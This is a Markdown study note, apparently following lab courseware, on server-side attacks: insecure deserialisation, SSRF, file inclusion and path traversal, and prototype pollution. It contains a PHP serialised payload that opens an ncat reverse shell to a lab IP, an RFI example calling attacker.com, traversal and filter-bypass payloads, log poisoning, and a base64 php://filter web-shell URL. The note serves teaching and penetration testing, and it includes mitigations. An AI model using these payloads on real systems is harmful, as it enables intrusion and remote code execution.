---
title: "Advanced Server-Side Attacks"
categories:
  - 技术
  - 教程
tags: [web app, Server-Side Attacks]
draft: true
sidebar: false
outline: 2
---

# Advanced Server-Side Attacks

Master the skills of advanced server-side attacks, covering SSRF, File Inclusions, Deserialization, Race Conditions, and Prototype Pollution.

## Insecure Deserialisation

User-supplied input has consistently been a catalyst for vulnerabilities, posing persistent threats across numerous platforms and applications. Exploiting user input, from SQL injection to [cross-site scripting](../security/webpentesting.md#cross-site-scripting), is a well-known challenge in securing web applications. Another less understood but equally dangerous vulnerability associated with user input is **insecure deserialisation**. 

Insecure deserialisation exploits occur when an application trusts serialised data enough to use it without validating its authenticity. This trust can lead to disastrous outcomes as attackers manipulate serialised objects to achieve remote code execution, escalate privileges, or launch denial-of-service attacks. This type of vulnerability is prevalent in applications that serialise and deserialise complex data structures across various programming environments, such as Java, .NET, and PHP, which often use serialisation for remote procedure calls, session management, and more.

### Some Important Concepts

<span style="font-size: 23px;">**Serialisation**</span>

![Serializsation](assets/Serialisation.png)

In programming, serialisation is the process of transforming an object's state into a human-readable or binary format (or a mix of both) that can be stored or transmitted and reconstructed as and when required. This capability is essential in applications where data must be transferred between different parts of a system or across a network, such as in web-based applications. In PHP, this process is performed using the `serialize()` function.

<span style="font-size: 23px;">**Deserialisation**</span>

![Deserialisation](assets/Deserialisation.png)

Deserialisation takes the packed-up data and turns it back into something you can use. Deserialisation is the process of converting the formatted data back into an object. It's crucial for retrieving data from files, databases, or across networks, restoring it to its original state for usage in applications.

---

### Object injection

Object injection is a vulnerability that arises from insecure data deserialisation in web applications. It occurs when untrusted data is deserialised into an object, allowing attackers to manipulate the serialised data to execute arbitrary code, leading to serious security risks. In this task, we'll explore how object injection works and demonstrate its impact through a simple PHP code snippet. 

As we know, the vulnerability arises from the process of serialisation and deserialisation, which allows PHP objects to be converted into a storable format (serialisation) and reconstructed back into objects (deserialisation). While serialisation and deserialisation are useful for data storage and transmission, they can also introduce security risks if not properly implemented.

To exploit a PHP Object Injection vulnerability, the application should include a class featuring a PHP **magic method** (like `__wakeup` or `__sleep`) that can be exploited for malicious purposes. All classes involved in the attack should be declared before calling the `unserialize()` method (unless object autoloading is supported).

**payload**

**index.html**

```php
<?php
class MaliciousUserData {
public $command = 'ncat -nv 10.10.211.209 4444 -e /bin/sh';
}

$maliciousUserData = new MaliciousUserData();
$serializedData = serialize($maliciousUserData);
$base64EncodedData = base64_encode($serializedData);
echo "Base64 Encoded Serialized Data: " . $base64EncodedData;
?>
```
Once you create the file, execute it through `php index.php` through the terminal. This will return a base64-encoded serialised object of the `MaliciousUserData` class.

```bash
┌──(root㉿kali)-[~]
└─# php index.html
Base64 Encoded Serialized Data: TzoxNzoiTWFsaWNpb3VzVXNlckRhdGEiOjE6e3M6NzoiY29tbWFuZCI7czozODoibmNhdCAtbnYgMTAuMTAuMjExLjIwOSA0NDQ0IC1lIC9iaW4vc2giO30= 
```

visiting the URL `http://10.10.134.46/case2/?decode=[SHELLCODE]`, the index.php file's deserialise function will deserialise the string and execute the `__wakeup()` function, leading to a remote shell. 

```bash
┌──(root㉿kali)-[~]
└─# nc -lvnp 4444 
listening on [any] 4444 ...
connect to [10.10.211.209] from (UNKNOWN) [10.10.134.46] 45884
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
ls    
UserData.php
flag.php
index.php
shell.php
test.php
cat flag.php
<?php
$flag = "THM{GOT_THE_SH#LL}";
?>
```
---

### Automation Scripts

PHP Gadge Chain (**[PHPGGC](https://github.com/ambionics/phpggc)**)

Java ecosystem **[Ysoserial](https://github.com/frohoff/ysoserial)** 


## SSRF 

**[Server Side Request Forgery](../security/webpentesting.md#ssrf)** (**SSRF**) is a web vulnerability where an attacker manipulates a vulnerable application to make requests to internal or external resources on behalf of the server. This can lead to data exposure, unauthorised access to internal systems, or service disruptions.

### Anatomy of SSRF Attack 

When developing networked software, it's common to make requests to external servers. Developers often use these requests to fetch remote resources like software updates or import data from other applications. While these requests are typically safe, improper implementation can lead to a vulnerability known as SSRF. 

![SSRF Attack](<assets/SSRF Attack.gif>)

An SSRF vulnerability can arise when user-provided data is used to construct a request, such as forming a URL. To execute an SSRF attack, **an attacker can manipulate a parameter value within the vulnerable software**, effectively creating or controlling requests from that software and directing them towards other servers or even the same server.

<span style="font-size: 23px;">**Risk of SSRF**</span>

**Data Exposure**

As explained earlier, cybercriminals can gain unauthorised access by tampering with requests on behalf of the vulnerable web application to gain access to sensitive data hosted in the internal network.

**Reconnaissance**

An attacker can carry out port scanning of internal networks by running malicious scripts on vulnerable servers or redirecting to scripts hosted on some external server.

**Denial of Service**

It is a common scenario that internal networks or servers do not expect many requests; therefore, they are configured to handle low bandwidth. Attackers can flood the servers with multiple illegitimate requests, causing them to remain unavailable to handle genuine requests.

### Types of SSRF

<span style="font-size: 23px;">**Basic**</span>

**Basic SSRF** is a web attack technique where an attacker tricks a server into making requests on their behalf, often targeting internal systems or third-party services. By exploiting vulnerabilities in input validation, the attacker can gain unauthorised access to sensitive information or control over remote resources, posing a significant security risk to the targeted application and its underlying infrastructure.

<span style="font-size: 23px;">**Blind**</span>

**Blind SSRF** refers to a scenario where the attacker can send requests to a target server, but they do not receive direct responses or feedback about the outcome of their requests. In other words, the attacker is blind to the server's responses. This type of SSRF can be more challenging to exploit because the attacker cannot directly see the results of their actions. We will discuss its various examples.

<span style="font-size: 23px;">**Blind SSRF With Out-Of-Band**</span>

**Out-of-band SSRF** is a technique where the attacker leverages a separate, out-of-band communication channel instead of directly receiving responses from the target server to receive information or control the exploited server. This approach is practical when the server's responses are not directly accessible to the attacker.

For instance, the attacker might manipulate the vulnerable server to make a DNS request to a domain he owns or to initiate a connection to an external server with specific data. This external interaction provides the attacker with evidence that the SSRF vulnerability exists and potentially allows him to gather additional information, such as internal IP addresses or the internal network's structure.

**payload**

[server.py](../files/pythonfile.md#out-of-band-ssrf)


<span style="font-size: 23px;">**Semi-Blind SSRF (Time-based)**</span>

Time-based SSRF is a variation of SSRF where the attacker leverages timing-related clues or delays to infer the success or failure of their malicious requests. By **observing how long it takes for the application to respond**, the attacker can make educated guesses about whether their SSRF attack was successful. 

The attacker sends a series of requests, each targeting a different resource or URL. The attacker measures the response times for each request. If a response takes significantly longer, it may indicate that the server successfully accessed the targeted resource, implying a successful SSRF attack.

---

### Crashing the Server

An attacker could abuse SSRF by crashing the server or creating a denial of service for other hosts. There are multiple instances ([WordPress](https://www.sonarsource.com/blog/wordpress-core-unauthenticated-blind-ssrf/), [CairoSVG](https://github.com/Kozea/CairoSVG/security/advisories/GHSA-rwmf-w63j-p7gv)) where attackers try to disrupt the availability of a system by launching SSRF attacks. 

For example, the attacker might input a URL pointing to a large file on a slow server or a service that responds with an overwhelming amount of data. When the vulnerable application naively accesses this URL, it engages in an action that exhausts its own system resources, leading to a slowdown or complete crash.

---

### Remedial Measures

Mitigation measures for SSRF are essential for preserving the security and integrity of web applications. Implementing robust SSRF mitigation measures helps protect against these risks by fortifying the application's defences, preventing malicious requests, and bolstering the overall security posture. As a critical element of web application security, SSRF mitigation measures are instrumental in preserving user data, safeguarding against data breaches, and maintaining trust in the digital ecosystem. A few of the important policies are mentioned below:

- **Implement strict input validation** and sanitise all user-provided input, especially any URLs or input parameters the application uses to make external requests.
- Instead of trying to blocklist or filter out disallowed URLs, **maintain allowlists of trusted URLs or domains**. Only allow requests to these trusted sources.
- **Implement network segmentation** to isolate sensitive internal resources from external access.
- **Implement security headers**, such as Content-Security-Policy, that restricts the application's load of external resources.
- **Implement strong access controls** for internal resources, so even if an attacker succeeds in making a request, they can't access sensitive data without proper authorisation.
- **Implement comprehensive logging and monitoring** to track and analyse incoming requests. Look for unusual or unauthorised requests and set up alerts for suspicious activity.

## File Inclusion, Path Traversal

**File Inclusion and Path Traversa**l are vulnerabilities that arise when an application allows external input to change the path for accessing files. For example, imagine a library where the catalogue system is manipulated to access restricted books not meant for public viewing. Similarly, in web applications, the vulnerabilities primarily arise from improper handling of file paths and URLs. These vulnerabilities allow attackers to include files not intended to be part of the web application, leading to unauthorized access or execution of code.

### Web Application Architecture

<span style="font-size: 23px;">**Structure of a Web Application**</span>

Web applications are complex systems comprising several components working together to deliver a seamless user experience. At its core, a web application has two main parts: the frontend and the backend.

1. **Frontend**: This is the user interface of the application, typically built using frameworks like React, Angular, or Vue.js. It communicates with the backend via APIs.

2. **Backend**: This server-side component processes user requests, interacts with databases, and serves data to the frontend. It's often developed using languages like PHP, Python, and Javascript and frameworks like Node.js, Django, or Laravel.

One of the fundamental aspects of web applications is the client-server model. In this model, the client, usually a web browser, sends a request to the server hosting the web application. The backend server then processes this request and sends back a response. The client and server communication usually happens over the HTTP/HTTPS protocols.

![client-server model](<assets/client-server model.png>)

**Server-Side Scripting and File Handling** 

Server-side scripts run on the server and generate the content of the frontend, which is then sent to the client. Unlike client-side scripts like JavaScript in the browser, server-side scripts can access the server's file system and databases. File handling is a significant part of server-side scripting. Web applications often need to read from or write to files on the server. For example, reading configuration files, saving user uploads, or including code from other files.

In short, file inclusion and path traversal vulnerabilities arise when user inputs are not properly sanitized or validated. Since attackers can inject malicious payloads to log files `/var/log/apache2/access.log` and manipulate file paths to execute the logged payload, an attacker can achieve remote code execution. An attacker may also read configuration files that contain sensitive information, like database credentials, if the application returns the file in plaintext. Lastly, insufficient error handling may also reveal system paths or file structures, providing clues to attackers about potential targets for path traversal or file inclusion attacks.

---

### File Inclusion Types

<span style="font-size: 23px;">**Remote File Inclusion**</span>

**Remote File Inclusion**, or **RFI**, is a vulnerability that allows attackers to include remote files, often through input manipulation. This can lead to the execution of malicious scripts or code on the server.

Typically, RFI occurs in applications that dynamically include external files or scripts. Attackers can manipulate parameters in a request to point to external malicious files. For example, if a web application uses a URL in a GET parameter like `include.php?page=http://attacker.com/exploit.php`, an attacker can replace the URL with a path to a malicious script.

<span style="font-size: 23px;">**Local File Inclusion**</span>

**Local File Inclusion**, or **LFI**, typically occurs when an attacker exploits vulnerable input fields to access or execute files on the server. Attackers usually exploit poorly sanitized input fields to manipulate file paths, aiming to access files outside the intended directory. For example, using a traversal string, an attacker might access sensitive files like `include.php?page=../../../../etc/passwd`.

While LFI primarily leads to unauthorized file access, it can escalate to RCE. This can occur if the attacker can upload or inject executable code into a file that is later included or executed by the server. Techniques such as log poisoning, which means injecting code into log files and then including those log files, are examples of how LFI can lead to RCE.

<span style="font-size: 23px;">**RFI vs LFI Exploitation Process**</span>

![RFI vs LFI Exploitation Process](<assets/RFI vs LFI Exploitation Process.png>)

This diagram above differentiates the process of exploiting RFI and LFI vulnerabilities. In RFI, the focus is on including and executing a remote file, whereas, in LFI, the attacker aims to access local files and potentially leverage this access to execute code on the server.

---

### PHP Wrappers

<span style="font-size: 23px;">**PHP Wrappers**</span>

PHP wrappers are part of PHP's functionality that allows users access to various data streams. Wrappers can also access or execute code through built-in PHP protocols, which may lead to significant security risks if not properly handled.

For instance, an application vulnerable to LFI might include files based on a user-supplied input without sufficient validation. In such cases, attackers can use the `php://filter` filter. This filter allows a user to perform basic modification operations on the data before it's read or written. For example, if an attacker wants to encode the contents of an included file like `/etc/passwd` in base64. This can be achieved by using the `convert.base64-encode` conversion filter of the wrapper. The final payload will then be `php://filter/convert.base64-encode/resource=/etc/passwd`

<span style="font-size: 23px;">**Data Wrapper**</span>

The data stream wrapper is another example of PHP's wrapper functionality. The `data://` wrapper allows inline data embedding. It is used to embed small amounts of data directly into the application code.

`data:text/plain,<?php%20phpinfo();%20?>`

- `data:` as the URL.
- `mime-type` is set as `text/plain`.
- The data part includes a PHP code snippet: `<?php phpinfo(); ?>`.

---

### Base Directory Breakouts

In web applications, safeguards are put in place to prevent path traversal attacks. However, these defences are not always foolproof. Below is the code of an application that insists that the filename provided by the user must begin with a predetermined base directory and will also strip out file traversal strings to protect the application from file traversal attacks:

```php
function containsStr($str, $subStr){
    return strpos($str, $subStr) !== false;
}

if(isset($_GET['page'])){
    if(!containsStr($_GET['page'], '../..') && containsStr($_GET['page'], '/var/www/html')){
        include $_GET['page'];
    }else{ 
        echo 'You are not allowed to go outside /var/www/html/ directory!';
    }
}
```
It's possible to comply with this requirement and navigate to other directories. This can be achieved by appending the necessary directory traversal sequences after the mandatory base folder.

**payload** `/var/www/html/..//..//..//etc/passwd`

The PHP function `containsStr` checks if a substring exists within a string. The if condition checks two things. First, if `$_GET['page']` does not contain the substring `../..`, and if `$_GET['page']` contains the substring `/var/www/html`, however, `..//..//` bypasses this filter because it still effectively navigates up two directories, similar to `../../`. It does not exactly match the blocked pattern `../..` due to the extra slashes. The extra slashes `//` in `..//..//` are treated as a single slash by the file system. This means `../../` and `..//..//` are functionally equivalent in terms of directory navigation but only `../../` is explicitly filtered out by the code.

<span style="font-size: 23px;">**Obfuscation**</span>

Obfuscation techniques are often used to bypass basic security filters that web applications might have in place. These filters typically look for obvious directory traversal sequences like `../`. However, attackers can often evade detection by obfuscating these sequences and still navigate through the server's filesystem.

Encoding transforms characters into a different format. In LFI, attackers commonly use URL encoding (percent-encoding), where characters are represented using percentage symbols followed by hexadecimal values. For instance, `../` can be encoded or obfuscated in several ways to bypass simple filters.

- Standard URL Encoding: `../` becomes `%2e%2e%2f`
- Double Encoding: Useful if the application decodes inputs twice. `../` becomes `%252e%252e%252f`
- Obfuscation: Attackers can use payloads like `....//`, which help in avoiding detection by simple string matching or filtering mechanisms. This obfuscation technique is intended to conceal directory traversal attempts, making them less apparent to basic security filters.

For example, imagine an application that mitigates LFI by filtering out `../`:

```php
$file = $_GET['file'];
$file = str_replace('../', '', $file);

include('files/' . $file);
```
An attacker can potentially bypass this filter using the following methods:

1. **URL Encoded Bypass**: The attacker can use the URL-encoded version of the payload like `?file=%2e%2e%2fconfig.php`. The server decodes this input to `../config.php`, bypassing the filter.

2. **Double Encoded Bypass**: The attacker can use double encoding if the application decodes inputs twice. The payload would then be `?file=%252e%252e%252fconfig.php`, where a dot is `%252e`, and a slash is `%252f`. The first decoding step changes `%252e%252e%252f` to `%2e%2e%2f`. The second decoding step then translates it to `../config.php`.

3. **Obfuscation**: An attacker could use the payload `....//config.php`, which, after the application strips out the apparent traversal string, would effectively become `../config.php`.

---

### LFI2RCE

<span style="font-size: 23px;">**Session Files**</span>

**PHP Session Files**

PHP session files can also be used in an LFI attack, leading to Remote Code Execution, particularly if an attacker can manipulate the session data. In a typical web application, session data is stored in files on the server. If an attacker can inject malicious code into these session files, and if the application includes these files through an LFI vulnerability, this can lead to code execution.

For example, the vulnerable application hosted in http://10.10.55.38/sessions.php contains the below code:

```php
if(isset($_GET['page'])){
    $_SESSION['page'] = $_GET['page'];
    echo "You're currently in" . $_GET["page"];
    include($_GET['page']);
}
```

**payload**

`<?php echo phpinfo(); ?>`

`/var/lib/php/sessions/sess_[sessionID]`

<span style="font-size: 23px;">**Log Poisoning**</span>

Log poisoning is a technique where an attacker injects executable code into a web server's log file and then uses an LFI vulnerability to include and execute this log file. This method is particularly stealthy because log files are shared and are a seemingly harmless part of web server operations. In a log poisoning attack, the attacker must first inject malicious PHP code into a log file. This can be done in various ways, such as crafting an evil user agent, sending a payload via URL using Netcat, or a referrer header that the server logs. Once the PHP code is in the log file, the attacker can exploit an LFI vulnerability to include it as a standard PHP file. This causes the server to execute the malicious code contained in the log file, leading to RCE.

For example, if an attacker sends a Netcat request to the vulnerable machine containing a PHP code:

```bash
$ nc 10.10.55.38 80      
<?php echo phpinfo(); ?>

```
**payload** `/var/log/apache2/access.log`

<span style="font-size: 23px;">**Wrappers**</span>

**PHP Wrappers**

PHP wrappers can also be used not only for reading files but also for code execution. The key here is the `php://filter` stream wrapper, which enables file transformations on the fly. Take the PHP base64 filter as an example. This method allows attackers to execute arbitrary code on the server using a base64-encoded payload. 

`<?php system($_GET['cmd']); echo 'Shell done!'; ?>`   →base64 →
`PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4`


`php://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+`

| Position | Field | Value |
| :--- | :--- | :--- |
| 1 | Protocol Wrapper | `php://filter` |
| 2 | Filter | `convert.base64-decode` |
| 3 | Resource Type | `resource=` |
| 4 | Data Type | `data://plain/text,` |
| 5 | Encoded Payload | `PD9waHAgc3lzdGVtKCRfR0VUWydjYWQnXSk7ZWNobwAnU2hlbGwgZG9uZSAhJzsgPz4+` |


`http://10.10.55.38/playground.php?page=php%3A%2F%2Ffilter%2Fconvert.base64-decode%2Fresource%3Ddata%3A%2F%2Fplain%2Ftext%2CPD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4%2B&cmd=uname+-a`


## Race Conditions

[details](../security/webpentesting.md#race-conditions)

## Prototype Pollution 

**Prototype Pollution** allows bad actors to manipulate and exploit the inner workings of JavaScript applications and enables attackers to gain access to sensitive data and application backend.

While prototype pollution is most commonly discussed in the context of JavaScript, the concept can apply to any system that uses a similar [prototype-based inheritance](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Inheritance_and_the_prototype_chain) model.

However, JavaScript's widespread use, particularly in web development, and its flexible and dynamic object model make prototype pollution a more prominent and relevant concern in this language. In contrast, [class-based inheritance](https://en.wikipedia.org/wiki/Class-based_programming) languages like Java or C++ have a different model of inheritance where classes (blueprints for objects) are typically static, and altering a class at runtime to affect all its instances is not a common practice or straightforward task.

[JavaScript basic concept](../cyber/WebApplication.md#js-basic-concept)

### How it Works

**Prototype pollution** is a vulnerability that arises when an attacker manipulates an object's prototype, impacting all instances of that object. In JavaScript, where prototypes facilitate inheritance, an attacker can exploit this to modify shared properties or inject malicious behaviour across objects.

*Prototype pollution, on its own, might not always present a directly exploitable threat. However, its true potential for harm becomes notably pronounced when it joins with other types of vulnerabilities, such as XSS and CSRF.*

`__proto__`

在 JavaScript 里，`__proto__` 是对象的一个内置属性，其作用是指向该对象的原型对象。借助这个属性，对象能够继承原型对象的属性和方法，这也是 JavaScript 实现继承的重要方式之一。

**关键特性**

1. **继承机制**：JavaScript 采用原型链来实现继承。当访问一个对象的属性或方法时，JavaScript 首先会在该对象本身查找，如果找不到，就会顺着 `__proto__` 所指的原型对象继续查找，以此类推，直到找到对应的属性或方法，或者查找到原型链的末尾（即 Object.prototype）。
2. **动态特性**：能够在运行时动态地修改 `__proto__` 的值，从而改变对象的继承关系。不过需要注意的是，这种操作会对性能产生一定影响，因此在实际应用中要谨慎使用。
3. **兼容性**：`__proto__` 虽然被大多数浏览器支持，但它并非 JavaScript 标准的一部分。在 ES6 中，推荐使用 `Object.getPrototypeOf()` 和 `Object.setPrototypeOf()` 方法来替代 `__proto__` 进行原型的获取和设置。

**payload**

```javascript
// Attacker's Payload
ben.__proto__.introduce=function(){console.log("You've been hacked, I'm Bob");}
console.log(ben.introduce()); 
```

- **Prototype Pollution Attack**: The attacker injects a malicious payload into the prototype's `introduce` method, changing its behaviour to display a harmful message. We have polluted the `__proto__` property here.
- **Impact on Existing Instances**: As a result, even the existing instance (`ben`) is affected, and calling `ben.introduce()` now outputs the attacker's injected message.

---

### Exploitation-XSS

<span style="font-size: 23px;">**Standard Approach**</span>

As we know, numerous properties are inherently present on the Object prototype in JavaScript. Among these, the `constructor` and `__proto__` properties stand out as particularly notable targets for exploitation by threat actors. The `constructor` property points to the function that constructs an object's prototype, while `__proto__` is a reference to the prototype object that the current object directly inherits from. Malicious actors often exploit these properties to manipulate an object's prototype chain, potentially leading to prototype pollution.

<span style="font-size: 23px;">**Golden Rule**</span>

The concept hinges on an attacker's ability to influence certain key parameters, such as `x` and `val`, in expressions akin to `Person[x][y] = val`. Suppose an attacker assigns `__proto__` to `x`. In that case, the attribute identified by `y` is universally set across all objects sharing the same class as the object with the value denoted by `val`.

In a more intricate scenario, when an attacker has control over `x`, `y`, and `val` in a structure like `Person[x][y][z] = val`, assigning `x` as `constructor` and `y` as `prototype` leads to a new property defined by `z` being established across all objects in the application with the assigned `val`. This latter approach necessitates a more complex arrangement of object properties, making it less prevalent in practice.

<span style="font-size: 23px;">**Few Important Functions**</span>

When identifying potential prototype pollution vulnerabilities, penetration testers should focus on commonly used vectors/functions susceptible to prototype pollution. A thorough examination of how an application handles object manipulation is crucial. We will understand a few important functions that an attacker can exploit, and then we will practically perform the exploitation.

- **Property Definition by Path**: Functions that set object properties based on a given path (like `object[a][b][c] = value`) can be dangerous if the path components are controlled by user input. These functions should be inspected to ensure they don't inadvertently modify the object's prototype. Consider an endpoint that allows users to update reviews about any friend.

**Initial Object Structure**

Before any updates are made, we have an initial friends array containing an object representing a friend's profile. Each profile object includes properties such as id, name, reviews, and albums.

```javascript
let friends = [ { id: 1, name: "testuser", age: 25, country: "UK", reviews: [], albums: [{ }], password: "xxx", } ]; 
_.set(friend, input.path, input.value);
```

**Input Received from User**

The user wants to add a review for their friend. They provide a payload containing the path where the review should be added (**reviews.content**) and the review content (`<script>alert(anycontent)</script>`).

An attacker updates the path to target the prototype:

```bash
{ "path": "reviews[0].content", "value": "&#60;script&#62;alert('anycontent')&#60;/script&#62;" };
```
We use the **_set** function from lodash to apply the payload and add the review content to the specified path within the friend's profile object.

**Resulting Object Structure**

After executing the code, the friends array will be modified to include the user's review. However, due to a lack of proper input validation, the review content provided by the user (`<script>alert('anycontent')</script>`) was directly added to the profile object without proper sanitisation.

```javascript
let friends = [
  {
    id: 1,
    name: "testuser",
    age: 25,
    country: "UK",
    reviews: [
      "<script>alert('anycontent')</script>"
    ],
    albums: [{}],
    password: "xxx",
  }
];
```
Similarly, suppose the attacker wants to insert a malicious property into the friend's profile. In that case, they provide a payload containing the path where the property should be added (**isAdmin**) and the value for the malicious property (true).

```javascript
const payload = { "path": "isAdmin", "value": true };
```
After executing the code, the `friends` array will be modified to include the malicious property **isAdmin** in the friend's profile object. The `friends` object will have the following structure:

```javascript
let friends = [
  {
    id: 1,
    name: "testuser",
    age: 25,
    country: "UK",
    reviews: [],
    albums: [],
    password: "xxx",
    isAdmin: true // Malicious property inserted by the attacker
  }
];
```
---

### Exploitation-Property Injection

<span style="font-size: 23px;">**Few Important Functions**</span>

- **Object Recursive Merge**: This function involves recursively merging properties from source objects into a target object. An attacker can exploit this functionality if the merge function does not validate its inputs and allows merging properties into the prototype chain. Considering the same social network example, let's assume the following code. Suppose the application has a function to merge user settings:

```javascript
// Vulnerable recursive merge function
function recursiveMerge(target, source) {
    for (let key in source) {
        if (source[key] instanceof Object) {
            if (!target[key]) target[key] = {};
            recursiveMerge(target[key], source[key]);
        } else {
            target[key] = source[key];
        }
    }
}

// Endpoint to update user settings
app.post('/updateSettings', (req, res) => {
    const userSettings = req.body; // User-controlled input
    recursiveMerge(globalUserSettings, userSettings);
    res.send('Settings updated!');
});
```
An attacker sends a request with a nested object containing `__proto__`:

```javascript
 { "__proto__": { "newProperty": "value" } } 
```
- **Object Clone**: Object cloning is a similar functionality that allows deep clone operations to copy properties from the prototype chain to another one inadvertently. Testing should ensure that these functions only clone the user-defined properties of an object and filter special keywords like `__proto__`, `constructor`, etc. A possible use case is that the application backend clones objects to create new user profiles.

---

### Exploitation - Denial of Service

Prototype pollution, a critical vulnerability in JavaScript applications, can lead to a Denial of Service ([DoS](../common.md#dos)) attack, among other severe consequences. This occurs when an attacker manipulates the prototype of a widely used object, causing the application to behave unexpectedly or crash altogether. In JavaScript, objects inherit properties and methods from their prototype, and altering this prototype impacts all objects that share it.

For example, if an attacker pollutes the `Object.prototype.toString` method, every subsequent call to this method by any object will execute the altered behaviour. In a complex application where `toString` is frequently used, this can lead to unexpected results, potentially causing the application to malfunction. The `toString` method is universally used in JavaScript. It's automatically invoked in many contexts, especially when an object needs to be converted to a string.

**payload**

```javascript
{"__proto__": {"toString": "Just crash the server"}}
```
---

### Automating the Process

<span style="font-size: 23px;">**Major Issues During Identification**</span>

Identifying prototype pollution is a tricky problem in any language particularly in JavaScript, because of the way JavaScript lets oneautomating the prototype pollution object share its features with another. Detecting this problem automatically with software tools is really hard because it's not straightforward like other common website security problems. Each website or web application is different, and figuring out where prototype pollution might happen requires someone to look closely at the website's code, understand how it works, and see where mistakes might be made.

Unlike other security issues that can be found by looking for specific patterns or signs, finding prototype pollution needs a deep dive into the website's code by a pentester/developer. It's all about understanding the complex ways objects in JavaScript can affect each other and spotting where something might go wrong. Security tools can help point out possible issues, but they can't catch everything. That's why having people who know how to read and analyse code carefully is so important. 

<span style="font-size: 23px;">**Few Important Scripts**</span>

Several tools and projects have been developed within the security and open-source communities to aid in the automation of finding prototype pollution vulnerabilities. Here are a few renowned GitHub repositories that provide tools, libraries, or insights into detecting prototype pollution vulnerabilities:

- [NodeJsScan](https://github.com/ajinabraham/nodejsscan) is a static security code scanner for Node.js applications. It includes checks for various security vulnerabilities, including prototype pollution. Integrating NodeJsScan into your development workflow can help automatically identify potential security issues in your codebase. 
- [Prototype Pollution Scanner](https://github.com/KathanP19/protoscan) is a tool designed to scan JavaScript code for prototype pollution vulnerabilities. It can be used to analyse codebases for patterns that are susceptible to pollution, helping developers identify and address potential security issues in their applications.
- [PPFuzz](https://github.com/dwisiswant0/ppfuzz) is another fuzzer designed to automate the process of detecting prototype pollution vulnerabilities in web applications. By fuzzing input vectors that might interact with object properties, PPFuzz can help identify points in an application that are susceptible to prototype pollution. 
- Client-side detection by [BlackFan](https://github.com/BlackFan/client-side-prototype-pollution) is focused on identifying prototype pollution vulnerabilities in client-side JavaScript. It includes examples of how prototype pollution can be exploited in browsers to perform XSS attacks and other malicious activities. It's a valuable resource for understanding the impact of prototype pollution on the client-side.

While identifying prototype pollution, the pentester should look for instances where user-controlled input might influence the keys or properties being merged, defined, or cloned. Verifying that the application properly sanitises and validates such input against modifying the prototype chain is crucial in preventing prototype pollution vulnerabilities.

---

### Mitigation Measures

Mitigating the risks associated with prototype pollution is crucial for both pentesters and secure code developers, as the vulnerability enables attackers to manipulate an object's prototype, potentially leading to unexpected behaviour and security issues. Here are some mitigation measures for prototype pollution:

<span style="font-size: 23px;">**Pentesters**</span>

- **Input Fuzzing and Manipulation**: Interact with user inputs extensively, especially those used to interact with prototype-based structures, and fuzz them with a variety of payloads. Look for scenarios where untrusted data can lead to prototype pollution.
- **Context Analysis and Payload Injection**: Analyse the application's codebase to understand how user inputs are used within prototype-based structures. Inject payloads into these contexts to test for prototype pollution vulnerabilities.
- **CSP Bypass and Payload Injection**: Evaluate the effectiveness of security headers such as CSP in mitigating prototype pollution. Attempt to bypass CSP restrictions and inject payloads to manipulate prototypes.
- **Dependency Analysis and Exploitation**: Conduct a thorough analysis of third-party libraries and dependencies used by the application. Identify outdated or vulnerable libraries that may introduce prototype pollution vulnerabilities. Exploit these vulnerabilities to manipulate prototypes and gain unauthorised access or perform other malicious actions.
- **Static Code Analysis**: Use static code analysis tools to identify potential prototype pollution vulnerabilities during the development phase. These tools can provide insights into insecure coding patterns and potential security risks.

<span style="font-size: 23px;">**Secure Code Developers**</span>

- **Avoid Using** `__proto__`: Refrain from using the `__proto__` property as it is mosltly susceptible to prototype pollution. Instead, use `Object.getPrototypeOf()` to access the prototype of an object in a safer manner.
- **Immutable Objects**: Design objects to be immutable when possible. This prevents unintended modifications to the prototype, reducing the impact of prototype pollution vulnerabilities.
- **Encapsulation**: Encapsulate objects and their functionalities, exposing only necessary interfaces. This can help prevent unauthorised access to object prototypes.
- **Use Safe Defaults**: When creating objects, establish safe default values and avoid relying on user inputs to set prototype properties. Initialise objects securely to minimise the risk of pollution.
- **Input Sanitisation**: Sanitise and validate user inputs thoroughly. Be cautious when using user-controlled data to modify object prototypes. Apply strict input validation practices to mitigate injection risks.
- **Dependency Management**: Regularly update and monitor dependencies. Choose well-maintained libraries and frameworks, and stay informed about any security updates or patches related to prototype pollution.
- **Security Headers**: Implement security headers such as Content Security Policy (CSP) to control the sources from which resources can be loaded. This can help mitigate the risk of loading malicious scripts that manipulate prototypes.

By combining rigorous testing practices, secure coding principles, and ongoing security awareness, both pentesters and secure code developers can contribute to the effective mitigation of Prototype Pollution vulnerabilities in applications. Regularly updating knowledge on emerging threats and vulnerabilities is essential to avoid potential risks.